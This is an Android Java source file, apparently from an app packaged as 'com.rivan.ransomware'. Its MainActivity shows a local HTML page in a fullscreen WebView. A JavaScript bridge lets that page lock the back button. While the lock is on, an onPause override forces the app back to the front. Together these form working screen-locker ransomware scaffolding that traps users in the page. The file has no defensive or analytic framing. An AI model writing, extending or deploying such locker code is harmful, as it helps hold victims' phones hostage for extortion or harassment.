package com.rivan.ransomware;

import android.app.Activity;
import android.os.Bundle;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.view.WindowManager;

public class MainActivity extends Activity {
    private WebView webView;
    private boolean backLocked = false;

    private class AndroidBridge {
        @JavascriptInterface
        public void lockBack() { backLocked = true; }

        @JavascriptInterface
        public void unlockBack() { backLocked = false; }

        @JavascriptInterface
        public void exitApp() {
            runOnUiThread(() -> {
                webView.destroy();
                finish();
                System.exit(0);
            });
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
        webView = new WebView(this);
        setContentView(webView);
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setAllowFileAccessFromFileURLs(true);
        webView.addJavascriptInterface(new AndroidBridge(), "Android");
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("file:///android_asset/index.html");
    }

    @Override
    public void onBackPressed() {
        if (backLocked) return;
        super.onBackPressed();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (backLocked) {
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            am.moveTaskToFront(getTaskId(), 0);
        }
    }
}
